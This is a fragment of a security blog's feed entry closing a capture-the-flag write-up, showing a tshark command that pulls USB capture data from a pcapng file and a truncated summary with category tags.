-<p>To extract the data only from the pcapng I used tshark:</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark -r Cat.pcapng -T fields -e usb.capdata &gt; capdata.txt</div></pre></td></tr></table></figure></p>
-<p>I didn't have time to search how to interpret the raw data into coordinates.</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
-&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;By&lt;/th&gt;
-&lt;th&gt;Version&lt;/th&gt;
-&lt;th&gt;Comment&lt;/th&gt;
-&lt;/t
-    
-    </summary>
-    
-      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
-    
-      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
-    
-    
-      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
-    
-      <category term="web" scheme="https://rawsec.ml/tags/web/"/>
-    
-      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
-    
-      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
-    
-      <category term="misc" scheme="https://rawsec.ml/tags/misc/"/>
     
   </entry>
   
